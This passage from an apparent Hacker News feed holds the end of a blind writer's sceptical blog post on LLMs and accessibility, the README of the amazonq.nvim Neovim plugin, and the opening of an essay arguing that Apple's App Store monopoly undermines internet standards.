    &lt;p&gt;I‚Äôm of two minds about this whole thing. While the stuff LLMs is giving us is incorrect information, it‚Äôs still information that the sighted world won‚Äôt or refuses to give us. While I absolutely hate the hype and even AI nonsense in general, and don‚Äôt use any LLM on any of my content, blind and visually impaired people can become audio book narrators if their Braille skills aren‚Äôt that great with ElevenLabs.&lt;/p&gt;
    &lt;p&gt;Even though I‚Äôll never hire a blind narrator that uses ElevenLabs to generate an audio book, am I practicing discrimination by doing this? Someone will say yes. I don‚Äôt know what will come of this wave in LLMs and dependance on AI, but I predict that once the hype dies down, well, blind and even legally blind people are probably going to be advocating for more accessibility measures but in a different way.&lt;/p&gt;
    &lt;p&gt;AI accessibility will have its own challenges. In fact, we‚Äôre already witnessing instances of AI developers forgetting disabled people exist so I fully predict that blind people will be advocating to make actual LLM platforms accessible. While that‚Äôs a fight that won‚Äôt happen for a while, I also predict that the actual text output of some of these generators will be inaccessible, prompting another push to make these interfaces usable by everyone. I also predict web accessibility will actually get worse, not better, as coding models will spit out inaccessible code that developers won‚Äôt check or won‚Äôt even care to check. But I‚Äôm the only one within the community that‚Äôs unenthusiastic about the benefits of AI within our community.&lt;/p&gt;
    &lt;p&gt;I‚Äôm old enough to remember when OCR became a huge hit to play video games, scan inaccessible documents, and otherwise. While I also use OCR for speed and efficiency, or just even to get halfway there, I still use a human to read stuff because, even today, OCR isn‚Äôt where I thought it was going to be. Same for self-driving cars. Now that AI is a thing now, I doubt OCR and even self-driving cars will get any significant advancements.&lt;/p&gt;
    &lt;p&gt;About usage, well, that‚Äôs what blind people are using LLMs for at this very moment. They‚Äôre using it to describe characters from TV shows and movies in great detail. they‚Äôre using it to describe music videos, but to the blind and visually impaired people that use these tools, they aren‚Äôt so much caring about the accuracy of the information. It‚Äôs information they‚Äôve never had previously. Accuracy is an afterthought. The only thing that matters is having information that they never had previously. Then again, these are the very same blind and visually impaired people that say that the Social model of Disability is woke PC nonsense, so it‚Äôs no surprise that the community as a whole would jump on the LLM hype. The blind and visually impaired people advocating for this have been conditioned to believe that technology will solve all accessibility problems because, simply put, humans won‚Äôt do it. Humans won‚Äôt care. Humans are inefficient squishy things that live in a completely different, subjective, world. Blind and visually impaired people don‚Äôt want to wade through a subjective landscape. Objectivity matters to our community, no matter the cost of accuracy.&lt;/p&gt;
    &lt;p&gt;Another reason the Blind community is enthusiastic about AI is simply because, to other blind people, it makes them feel like less of a burden on society and vastly more independent. With an LLM, it will never get annoyed, aggravated, think less of the person, or similar. Humans have been conditioned to think we are useless because we are blind so any help we ask for is viewed as a job or a chore rather than a chance to make someone‚Äôs life easier.&lt;/p&gt;
    &lt;p&gt;Also, most blind people don‚Äôt have a sighted person around because sighted people never willingly talk to a blind person just because. An LLM will always be there, well, until the servers go down, but this isn‚Äôt even a concern yet within the community and I don‚Äôt think it will be a thought until an AI server goes down the same way bionic eye servers shut down.&lt;/p&gt;
    &lt;p&gt;Even though I don‚Äôt use AI or LLMs and even though I do have in person and remote friends I can get assistance from without feeling as if I‚Äôm wasting their life, I‚Äôm also thinking about how our community has just replaced being dependent on humans with being dependent on tech and technology. I wonder, though, what will be the next technology thing our community clings to because humans fail us again, and again, and again, and again. Humans still continuously actually say no to accessibility when designing websites, so it‚Äôs also no wonder why some blind and visually impaired people are championing AI accessibility toolbars like AccessiBe. The web is inaccessible, and, with every refusal of our basic access needs, it‚Äôs no wonder the community has given up on humans and dove headfirst into putting faith in another algorithm.&lt;/p&gt;
    &lt;p&gt;My stance is very unique within the community. Have I used these tools to describe a picture when no human was around? Of course. I‚Äôve used it to describe memes now that the Say my Meme podcast appears to have stopped updating. I‚Äôve used it to get a starting point on pictures. It‚Äôs the same with OCR. Even though I‚Äôve used these tools, I just don‚Äôt think they are even worth half the hype. In fact, even today, there are incidences happening where AI is starting to look like Web3 hype nonsense. The Facebook thing got rid of their responsible AI team, search engines are useless because AI junk is flooding results now, small search engines are becoming very popular, indicating people are tired of this new wave of content. OpenAI can‚Äôt decide if it wants to fire people or bring them back because of ethics over growth, and Tech billionaires keep strategizing to make even more money off their own hype.&lt;/p&gt;
    &lt;p&gt;There are many more examples of AI going very wrong and basically even making people very angry that big tech is stealing their labor, but I‚Äôll leave you with the best podcast to debunk all the AI hype and nonsense. Well, okay, two podcasts. Tech Won‚Äôt Save Us, which is basically a podcast that detests tech and tech culture in general, and my personal favorite, Mystery AI Hype Theater 3000, a podcast that debunks all the AI hype.&lt;/p&gt;
    &lt;p&gt;Meanwhile, I‚Äôll be reading personal blogs and the small web because the indieweb is cozy and because personal websites won‚Äôt die as often nor as quickly as the rest of the web. Tootles!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45113043</guid></item><item><title>Amazonq.nvim: Official AWS AI Assistant Plugin for Neovim</title><link>https://github.com/awslabs/amazonq.nvim</link><description>&lt;doc fingerprint="fe78da1a289eb3da"&gt;
  &lt;main&gt;
    &lt;p&gt;This plugin integrates Amazon Q Developer with Neovim, providing Chat functionality, Inline Code Suggestions, and other Amazon Q capabilities. After installation, authenticate through IAM Identity Center or AWS Builder ID. You can use Amazon Q for free without an AWS account by authenticating with Builder ID.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;NodeJS &amp;gt;=18&lt;/item&gt;
      &lt;item&gt;Neovim &amp;gt;=0.10.4&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Install the plugin using your preferred method (see Installation Options)&lt;/item&gt;
      &lt;item&gt;Configure the plugin in your Neovim config: &lt;quote&gt;require('amazonq').setup({ ssoStartUrl = 'https://view.awsapps.com/start', -- Authenticate with Amazon Q Free Tier })&lt;/quote&gt;&lt;/item&gt;
      &lt;item&gt;Run &lt;code&gt;:AmazonQ&lt;/code&gt;from any file to start using the plugin&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To install and use the plugin, you only need to clone this repo and add in to Neovim runtimepath location:&lt;/p&gt;
    &lt;code&gt;-- Add the plugin to Neovim's runtimepath
vim.cmd[[set runtimepath+=/path/to/amazonq.nvim]]

-- Configure the plugin
require('amazonq').setup({
  ssoStartUrl = 'https://view.awsapps.com/start', -- Authenticate with Amazon Q Free Tier
})&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;See Configuration to configure other settings. &lt;list rend="ul"&gt;&lt;item&gt;By default the plugin will look for &lt;code&gt;node&lt;/code&gt;on your $PATH. To set an explicit location, set&lt;code&gt;cmd&lt;/code&gt;.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;By default the plugin will look for &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Run &lt;code&gt;:AmazonQ&lt;/code&gt;from any file.&lt;/item&gt;
      &lt;item&gt;Optional: Code completions are provided by the "textDocument/completion" LSP method, which "just works" with most autocompletion plugins. &lt;list rend="ul"&gt;&lt;item&gt;Note: completion is limited to supported filetypes.&lt;/item&gt;&lt;item&gt;See Inline Code Suggestions.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;local Plug = vim.fn['plug#']
vim.call('plug#begin')
Plug 'git@github.com:awslabs/amazonq.nvim.git'
vim.call('plug#end')

require('amazonq').setup({
  ssoStartUrl = 'https://view.awsapps.com/start', -- Authenticate with Amazon Q Free Tier
})&lt;/code&gt;
    &lt;code&gt;-- plugins.lua
return {
  {
    name = 'amazonq',
    url = 'https://github.com/awslabs/amazonq.nvim.git',
    opts = {
      ssoStartUrl = 'https://view.awsapps.com/start',  -- Authenticate with Amazon Q Free Tier
    },
  },
}&lt;/code&gt;
    &lt;p&gt;You can authenticate using one of two methods:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Amazon Q Free Tier: Use AWS Builder ID with the URL &lt;code&gt;https://view.awsapps.com/start&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Amazon Q Developer Pro: Use the start URL provided by your administrator&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Configure authentication by setting the &lt;code&gt;ssoStartUrl&lt;/code&gt; value in your setup:&lt;/p&gt;
    &lt;code&gt;require('amazonq').setup({
  ssoStartUrl = 'https://view.awsapps.com/start', -- For Free Tier with AWS Builder ID
  -- OR
  -- ssoStartUrl = 'your-organization-sso-url', -- For Pro subscription
})&lt;/code&gt;
    &lt;p&gt;The plugin provides a single global &lt;code&gt;:AmazonQ&lt;/code&gt; command and &lt;code&gt;zq&lt;/code&gt; mapping:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Command/Mapping&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:AmazonQ&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open Amazon Q chat window&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;zq&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Select text, then type &lt;code&gt;zq&lt;/code&gt; to append it to the chat context. Equivalent to: select text, type &lt;code&gt;:AmazonQ&lt;/code&gt;, then run the command.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:AmazonQ refactor&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Select code, then run this to get refactoring suggestions&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:.AmazonQ fix&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Fix only the current line (the standard "." range means "current line")&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:%AmazonQ optimize&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Optimize the entire contents of the current file&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;:AmazonQ explain&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Explain the current file&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;For complete documentation, see :help amazonq-usage and :help amazonq-chat.&lt;/p&gt;
    &lt;p&gt;Below are the available configuration options with their default values. Only &lt;code&gt;ssoStartUrl&lt;/code&gt; is required. See :help amazonq-config
for details.&lt;/p&gt;
    &lt;code&gt;require('amazonq').setup({
  -- REQUIRED: SSO portal URL for authentication
  ssoStartUrl = 'https://view.awsapps.com/start',
  -- OR
  -- ssoStartUrl = 'your-organization-sso-url', -- For Pro subscription

  -- Command to start Amazon Q Language Server
  -- Defaults to the language server bundled with this plugin
  cmd = { 'node', 'language-server/build/aws-lsp-codewhisperer-token-binary.js', '--stdio' },
  
  -- Filetypes where the Q will be activated
  -- See: https://docs.aws.amazon.com/amazonq/latest/qdeveloper-ug/q-language-ide-support.html
  -- `amazonq` is required for Q Chat feature.
  filetypes = {
      'amazonq', 'bash', 'java', 'python', 'typescript', 'javascript', 'csharp', 
      'ruby', 'kotlin', 'sh', 'sql', 'c', 'cpp', 'go', 'rust', 'lua',
  },

  -- Enable/disable inline code suggestions
  inline_suggest = true,

  -- Configure the chat panel position and appearance
  on_chat_open = function()
    vim.cmd[[
      vertical topleft split
      set wrap breakindent nonumber norelativenumber nolist
    ]]
  end,

  -- Enable debug mode for development
  debug = false,
})&lt;/code&gt;
    &lt;p&gt;Amazon Q provides AI-powered code suggestions as you type. These are implemented through the LSP &lt;code&gt;textDocument/completion&lt;/code&gt; method and work with most Neovim completion plugins (nvim-cmp, blink, mini.completion, etc.).&lt;/p&gt;
    &lt;p&gt;To use inline suggestions:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Authenticate with &lt;code&gt;:AmazonQ login&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Start typing in a supported filetype&lt;/item&gt;
      &lt;item&gt;Trigger completion using your completion plugin's keybinding&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Inline suggestions are enabled by default. To disable them:&lt;/p&gt;
    &lt;code&gt;require('amazonq').setup({
  -- Other settings...
  inline_suggest = false,
})&lt;/code&gt;
    &lt;p&gt;For plugin-specific configuration, see :help amazonq-config-completion.&lt;/p&gt;
    &lt;p&gt;To verify the language server is running:&lt;/p&gt;
    &lt;code&gt;:checkhealth vim.lsp&lt;/code&gt;
    &lt;p&gt;This shows if the server is attached to the current file and displays the path to the log file (e.g. &lt;code&gt;/local/home/$user/.local/state/nvim/lsp.log&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;To see detailed communication between the plugin and Language Server:&lt;/p&gt;
    &lt;code&gt;vim.lsp.set_log_level('debug')&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;If the plugin isn't working, ensure NodeJS &amp;gt;=18 is installed and in your PATH&lt;/item&gt;
      &lt;item&gt;For authentication issues, verify your &lt;code&gt;ssoStartUrl&lt;/code&gt;is correct&lt;/item&gt;
      &lt;item&gt;For filetype-specific problems, check that the filetype is in your &lt;code&gt;filetypes&lt;/code&gt;configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To develop this plugin, you probably want to add it to the Nvim &lt;code&gt;'runtimepath'&lt;/code&gt; so that you can test your changes easily. In that case, remove it from your plugin manager config.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Clone amazonq.nvim package locally:&lt;/p&gt;
        &lt;code&gt;git clone git@github.com:awslabs/amazonq.nvim.git&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Remove amazonq.nvim from your plugin manager config, if necessary.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Add the amazonq.nvim package to the Nvim&lt;/p&gt;&lt;code&gt;'runtimepath'&lt;/code&gt;. This tells Nvim to look for plugins at that path.&lt;quote&gt;vim.cmd[[set runtimepath+=/path/to/amazonq.nvim]]&lt;/quote&gt;&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;You can now use the&lt;/p&gt;&lt;code&gt;amazonq&lt;/code&gt;plugin located in the amazonq.nvim package path. You can make edits, restart Nvim to test them, open Pull Requests, etc.&lt;quote&gt;require('amazonq').setup({ ssoStartUrl = 'https://view.awsapps.com/start', debug = true, -- Enable debug mode during development })&lt;/quote&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See develop.md for more implementation details of plugin and language server.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;To debug the LSP server, see https://github.com/aws/language-servers/blob/main/CONTRIBUTING.md#with-other-clients&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;To enable logging, pass &lt;code&gt;debug=true&lt;/code&gt;to&lt;code&gt;require('amazonq').setup{}&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Logs are written to &lt;code&gt;vim.fs.joinpath(vim.fn.stdpath('log'), 'amazonq.log')&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Nvim also produces its own &lt;code&gt;vim.lsp&lt;/code&gt;logs by default.&lt;list rend="ul"&gt;&lt;item&gt;Enable DEBUG log-level for Nvim lsp (hint: put this in a workspace-local &lt;code&gt;.nvim.lua&lt;/code&gt;file and enable the&lt;code&gt;:help 'exrc'&lt;/code&gt;option):&lt;code&gt;vim.lsp.set_log_level('debug')&lt;/code&gt;&lt;/item&gt;&lt;item&gt;File: &lt;code&gt;:lua =vim.lsp.log.get_filename()&lt;/code&gt;&lt;/item&gt;&lt;item&gt;Logs produced by Amazon Q Language server will appear there as &lt;code&gt;"window/logMessage"&lt;/code&gt;messages:&lt;code&gt;"window/logMessage", ‚Ä¶ "Runtime: Initializing runtime without encryption", type = 3 } } "window/logMessage", ‚Ä¶ "Runtime: Registering IAM credentials update handler", type = 3 } } "window/logMessage", ‚Ä¶ "Runtime: Registering bearer credentials update handler", type = 3 } } ... "window/logMessage", ‚Ä¶ "Q Chat server has been initialized", type = 3 } } "window/logMessage", ‚Ä¶ "SSO Auth capability has been initialised", type = 3 } } "window/logMessage", ‚Ä¶ "Auth Device command called", type = 3 } } "window/logMessage", ‚Ä¶ 'Resolved SSO token {"accessToken":"‚Ä¶","expiresAt":"2025-01-21T21:44:20.631Z",‚Ä¶}',‚Ä¶} } "window/logMessage", ‚Ä¶ "Received chat prompt", type = 3 } } "window/logMessage", ‚Ä¶ "Request for conversation id: New conversation", type = 3 } }&lt;/code&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Enable DEBUG log-level for Nvim lsp (hint: put this in a workspace-local &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Code is formatted using stylua and linted using selene. Currently it's not automated, you must run it manually:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Install the required tools: &lt;list rend="ul"&gt;&lt;item&gt;stylua: &lt;list rend="ul"&gt;&lt;item&gt;macOS: &lt;code&gt;brew install stylua&lt;/code&gt;&lt;/item&gt;&lt;item&gt;win/linux: https://github.com/JohnnyMorganz/StyLua/releases&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;item&gt;macOS: &lt;/item&gt;&lt;item&gt;selene: &lt;list rend="ul"&gt;&lt;item&gt;macOS: &lt;code&gt;brew install selene&lt;/code&gt;&lt;/item&gt;&lt;item&gt;win/linux: https://github.com/Kampfkarren/selene/releases&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;item&gt;macOS: &lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;stylua: &lt;/item&gt;
      &lt;item&gt;Run (from the top level directory): &lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;To check files both selene and stylua in check mode:&lt;/p&gt;&lt;quote&gt;make lint&lt;/quote&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;To format files with stylua:&lt;/p&gt;&lt;quote&gt;make format&lt;/quote&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Inline suggestions are provided by creating a in-process LSP shim client is named &lt;code&gt;amazonq-completion&lt;/code&gt;.&lt;list rend="ul"&gt;&lt;item&gt;This is a temporary measure until Q LSP provides this out of the box.&lt;/item&gt;&lt;item&gt;Vim has a known limitation where it replaces newlines &lt;code&gt;\n&lt;/code&gt;in multiline completions with NUL bytes, which it renders as&lt;code&gt;^@&lt;/code&gt;. amazonq.nvim works around this by replacing the NUL bytes in a&lt;code&gt;CompleteDone&lt;/code&gt;event-handler.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The Neovim plugin for Amazon Q Developer is in experimental state. We welcome contributions and feedback! See Contributing Guide for details on contributing feedback, feature requests, and bug reports.&lt;/p&gt;
    &lt;p&gt;See CONTRIBUTING for more information.&lt;/p&gt;
    &lt;p&gt;This project is licensed under the Apache-2.0 License.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45113251</guid></item><item><title>Apple's Assault on Standards</title><link>https://infrequently.org/2025/09/apples-crimes-against-the-internet-community/</link><description>&lt;doc fingerprint="a5c8fb1e0124157c"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Apple's Assault on Standards&lt;/head&gt;
    &lt;head rend="h3"&gt;Will we notice? And what can be done?&lt;/head&gt;
    &lt;p&gt;TL;DR: Market competition underlies the enterprise of standards. It creates the only functional test of designs and functions as a pressure release valve that enables standards-based ecosystems route around single-vendor damage. Without competition, standards bodies have no purpose, and neither they, nor the ecosystems they support, can retain relevance. Apple has poisoned the well through a monopoly on influence which it has parleyed into suppression of browser choice. This is an existential threat to the web, but also renders web and internet standards moot. Internet standards bodies should recognise the threat and respond.&lt;/p&gt;
    &lt;p&gt;Internet enthusiasts of the previous century were sometimes given to expressing the power of code declaring the sovereignty of cyberspace, or that "code is law."&lt;/p&gt;
    &lt;p&gt;As odd as these claims sound today, they hit a deep truth: end-users lack power to re-litigate choices embodied in software. Vendors, therefore, have power over them. Backed by deeply embedded control chokepoints, and without a proportional response from other interests, this control is akin to state power.&lt;/p&gt;
    &lt;p&gt;Both fear and fervour about these proprties developed against a backdrop of libertarian1 attitudes toward regulation and competition. Attenuating vendor power through interoperability was, among other values, a shared foundation of collaboration for internet pioneers.&lt;/p&gt;
    &lt;p&gt;The most fervent commitment of this strain was faith in markets to sort out information distribution problems through pricing signals,2 and that view became embedded deeply into the internet's governance mechanisms.3 If competition does not function, neither do standards.&lt;/p&gt;
    &lt;p&gt;The internet's most consequential designs took competitive markets as granted. Many participants believed hardware and software markets would (or should) continue to decouple; that it would be ever easier for end-users to bring software of their choosing to devices they had purchased. Their faith in the trajectory was well-founded. It is ludicrous from the perspective of 2025 to suggest that swapping implementations of nearly any internet standard should come at the cost of replacing hardware.&lt;/p&gt;
    &lt;p&gt;Internet standards bodies assumed the properties of open operating systems and low-cost replacement of software to such an extent that their founding documents scarcely bother to mention them.4 Only later did statements of shared values see fit to make the subtext clear.&lt;/p&gt;
    &lt;p&gt;And it has worked. Internet standards have facilitated interoperability that has blunted lock-in, outsized pricing power, and monopolistic abuses. This role is the entire point of standards at a societal level, and the primary reason competition law carves out space for competitors to collaborate to develop standards.5&lt;/p&gt;
    &lt;p&gt;But standardisation is not purely an economic project. Standards attenuate the power of firms that might seek to arrogate code's privileges. Functional interoperability enables competition, and in so doing, reallocates power to users. Interoperability, and the standards that ensure it, are therefore at least partially a political project; one that aligns with the values of open societies:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;We must ask whether ... we should not prepare for the worst leaders, and hope for the best. But this leads to a new approach to the problem of politics, for it forces us to replace the question: "Who should rule?" by the new question: "How can we so organize political institutions that bad or incompetent rulers can be prevented from doing too much damage?"&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Without a counterweight, network effects allow successful tech firms to concentrate wealth and political influence. This power allows them to degrade potential competitive challenges, enabling rent extraction for services that would otherwise be commodities. This mechanism operates through (often legalised) corruption of both legal and electoral systems, and when left to fester, is caustic to democracy itself.6&lt;/p&gt;
    &lt;p&gt;As we shall see, Apple has deftly used a false cloak of security and privacy to move the internet, and web in particular, toward enclosure and irrelevance. Below, I develop the case for why Apple should be considered a corrupted, and indeed incompetent, autocrat in the digital lives of millions, abusing a unique form of monopoly to extract rapacious rents, including on the last remnants of open ecosystems it tolerates.&lt;/p&gt;
    &lt;p&gt;Worse, Apple's centralisation through the App Store entrenches the positions of peer big tech firms, harming the prospects of competitors in turn. I submit that Apple have been, over the course of many years, poisonous to internet standards and the moral commitments embodied in that grand project.7&lt;/p&gt;
    &lt;p&gt;Despite near continuous horse-race coverage in the tech press, the consequences of this regression in civic/technical affairs is not well socialised.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Power of Interoperability&lt;/head&gt;
    &lt;p&gt;One reason to champion the cause of standardisation is that it signifies the expansion of interoperable technology to carry a growing part of our digital workloads, pushing firms to innovate, rather than extracting rents for access to commodity features.&lt;/p&gt;
    &lt;p&gt;Interoperability-in-being allows users to choose alternative implementations, forcing competitors to differentiate on quality and not yet standard features. Standards accelerate the emergence of true interoperability by lowering the costs implementation and reducing tails risks to implementers, e.g. from patent trolls. Over time, a vibrant and growing set of standards can attenuate the power of vendors to extract rents and prevent progress in important domains.&lt;/p&gt;
    &lt;p&gt;Interoperability is not the only mechanism that can dampen the power of dominant firms, but it is the most powerful. Free and Open Source software (FOSS) can provide a counterweight to rentiers, but OSS is not a full solution.8&lt;/p&gt;
    &lt;head rend="h2"&gt;Voluntary Adoption Is Foundational to Internet Standards&lt;/head&gt;
    &lt;p&gt;Interoperability, and the economic surpluses that flow from it, are underpinned by the bedrock principle of voluntary adoption. This is enshrined in the "open stand" principles agreed to by no less than ISOC, IETF, IAB, IEEE, and the W3C.:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;...&lt;/p&gt;&lt;p&gt;5. Voluntary Adoption&lt;/p&gt;&lt;p&gt;Standards are voluntarily adopted and success is determined by the market.&lt;/p&gt;&lt;p&gt;‚Äî The IAB, IEEE, IETF, ISOC, and W3C,&lt;/p&gt;&lt;lb/&gt;"The OpenStand Principles"&lt;/quote&gt;
    &lt;p&gt;This final principle is the shortest, and many readers will understand it a dodge; a way for Standards Development Organisations (SDOs) to avoid being seen to "picking winners". But it is not only that.&lt;/p&gt;
    &lt;p&gt;By citing a property of markets that must be materially available for internet standards to function, this principle implicitly binds participants to a presumption of fair play, both for themselves, and for others in the ecosystems that standards bodies facilitate.&lt;/p&gt;
    &lt;p&gt;Several implications bear mentioning.&lt;/p&gt;
    &lt;p&gt;First, the principle of voluntary adoption is a predicate for effective standards' development. Without some mechanism for determining which designs are good vs. bad, we are unable to make consistent progress, and that test never comes from within an SDO; it is always extrinsic and customer-defined. Writing a standard is not a test of quality, and conversely, without a functional market in which to test designs, SDOs are irrelevant.&lt;/p&gt;
    &lt;p&gt;Second, this principle outlines a live-and-let-live doctrine, both within standards bodies and in the market. Participants may want their design to "win", but are enjoined from using procedural shenanigans to prevent competing designs from also being standardised.&lt;/p&gt;
    &lt;p&gt;Lastly, voluntary adoption marks customers (developers) and suppliers (browser vendors, etc.) as peers worthy of mutual respect and creates a clear norm within the walls of SDOs.&lt;/p&gt;
    &lt;p&gt;For all of these reasons, voluntary adoption must be inviolable, and actions taken to undermine it must be met with resistance and eventual sanction.&lt;/p&gt;
    &lt;head rend="h2"&gt;Apple's Unique Monopoly&lt;/head&gt;
    &lt;p&gt;Regulators have had no difficulty in building market tests that demonstrate the power Apple holds in the lives of users.&lt;/p&gt;
    &lt;p&gt;Some of these tests have produced comical contortions as Apple has attempted to weasel out of its responsibilities. Consider the Trinitarian claim that Safari is simultaneously one product, and also three. Or that iPadOS, despite sharing nearly all code with iOS, being marketed under that brand for many years, supporting considerably identical features, running all the same third-party software, and being released on substantially the same cadence, while running exclusively on hardware of the same architecture as iOS devices is, somehow, an entirely different product.9&lt;/p&gt;
    &lt;p&gt;But these tests, for as clear and effective as they have been, do not capture the most important aspects of Apple's influence on the market for smartphone software.&lt;/p&gt;
    &lt;p&gt;Apple's ability to negatively impact the potential of standards-based platforms to disrupt the App Store relies on properties of the market that every software developer understands: a monopoly on wealthy users, and through it, influence.&lt;/p&gt;
    &lt;p&gt;Competition law does not explicitly recognise or endorse this distortion of the market structure, but the connection between the influence of wealthy users and the downstream choices available to other end-users is indisputable in mobile ecosystems.&lt;/p&gt;
    &lt;p&gt;Despite selling fewer than a quarter of smartphone devices every year for the past decade, Apple has maintained iron control over the way smartphone software is developed and delivered, owing to the social and market effects of wealthy users gravitating to iOS devices. Apple uses both legitimately superior product attributes (e.g., leading chip design) along with anti-user and anticompetitive tactics ‚Äî e.g., green vs. blue chat bubbles, suppression of browsers ‚Äî to maintain this position.&lt;/p&gt;
    &lt;p&gt;Apple imposes an interlocking set of restrictions to help ensure that standards-based platforms cannot disrupt its position as the primary arbiter and delivery channel of software for wealthy users. Those users, in turn, enjoy disproportionate influence over the behaviour of software developers, owing both to their greater spending power, and their collective ability to determine the relevance of competing platforms thanks to their positions within the software industry. Developers of all stripes understand that if they cannot demo their wares to the bosses and VCs (all of whom are wealthy) on their own devices, their software might as well not exist.&lt;/p&gt;
    &lt;p&gt;The long-stable propensity of users who make more than $100K USD/year to carry iPhones combines with Apple's suppression of browsers and PWA capabilities to ensure that developers have no effective choice but to build native applications, for which Apple extracts rents. These effects were visible in population-level statistics a decade ago and have been stable ever since:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Knowing whether someone owns an iPad in 2016 allows us to guess correctly whether the person is in the top or bottom income quartile 69 percent of the time. Across all years in our data, no individual brand is as predictive of being high-income as owning an Apple iPhone in 2016.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Over time, the effect becomes self re-enforcing: developers are forced into the App Store due to a lack of capabilities in browsers, granting proprietary ecosystems a library of software with no interoperable parallel. This further induces wealthy and influential users to seek software exclusively through App Stores.&lt;/p&gt;
    &lt;p&gt;The monopoly on influence explains in part why Apple is wedded to legalistic, dissembling tactics in order to prevent the spread of standards-based platforms. Should the work of internet and web standards bodies ever become relevant, Cupertino understands the market for software will transform in ways it cannot control or tax.&lt;/p&gt;
    &lt;head rend="h3"&gt;How Apple Uses Its Monopoly to Centralise and Enclose&lt;/head&gt;
    &lt;p&gt;Developers are forced into the App Store, first and foremost, by a lack of functionality in standards-based alternatives. By contrast, Apple has used over-broad grants of system capabilities to woo developers with an interest in monetising user data through too-broad grants of detailed information about users and unconscionable allowances for suppressing pro-privacy interventions by the most rapacious native apps.10 When Apple professes that "privacy is a human right", we must understand this as an attempt to turn the consequences of Apple's own largesse towards data abusers into a marketing asset and an attempt to convince users not to flee the proprietary ecosystem it favours.&lt;/p&gt;
    &lt;p&gt;These over-broad grants depend, fundamentally, on Apple's own decisions.&lt;/p&gt;
    &lt;p&gt;It was Apple's choice to introduce less safe, less privacy-preserving native apps into iOS. It was also Apple's choice to deny competing browsers engines the freedom of voluntary feature adoption, ensuring that important underlying capabilities could only ever be accessed through Apple's proprietary APIs, and only ever by those who are willing to agree to Cupertino's terms.&lt;/p&gt;
